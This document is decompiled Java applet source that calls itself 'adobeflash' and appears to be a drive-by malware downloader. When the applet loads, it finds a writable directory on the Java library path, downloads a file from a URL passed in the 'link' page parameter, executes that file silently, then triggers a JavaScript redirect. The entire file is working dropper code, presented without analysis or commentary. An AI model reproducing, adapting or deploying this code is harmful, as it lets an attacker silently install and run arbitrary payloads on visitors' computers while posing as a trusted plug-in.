import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class adobeflash extends Applet
{
    private boolean isWriteable(final String s, final String s2) {
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(s + File.pathSeparator + s2);
            fileOutputStream.write(1);
            fileOutputStream.close();
            new File(s + File.pathSeparator + s2).delete();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    private boolean DownloadFile(final String s, final String s2) {
        try {
            final URL url = new URL(s);
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2));
            final InputStream inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            if (inputStream != null) {
                inputStream.close();
            }
            if (bufferedOutputStream != null) {
                bufferedOutputStream.close();
            }
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    public void CallJavaScript() {
        final String s = "redirect";
        try {
            this.getAppletContext().showDocument(new URL("javascript:doRedirect(\"" + s + "\")"));
        }
        catch (Exception ex) {}
    }
    
    @Override
    public void init() {
        try {
            final String[] split = System.getProperty("java.library.path").split(File.pathSeparator);
            String s = null;
            final String parameter = this.getParameter("link");
            for (int i = 0; i < split.length; ++i) {
                final String s2 = split[i];
                if (this.isWriteable(s2, "57ef66de")) {
                    s = s2;
                    break;
                }
            }
            if (s != null && this.DownloadFile(parameter, s + "\\tmp_F458GB4C.phx")) {
                Runtime.getRuntime().exec(s + "\\tmp_F458GB4C.phx").waitFor();
                this.CallJavaScript();
            }
        }
        catch (Exception ex) {}
    }
}
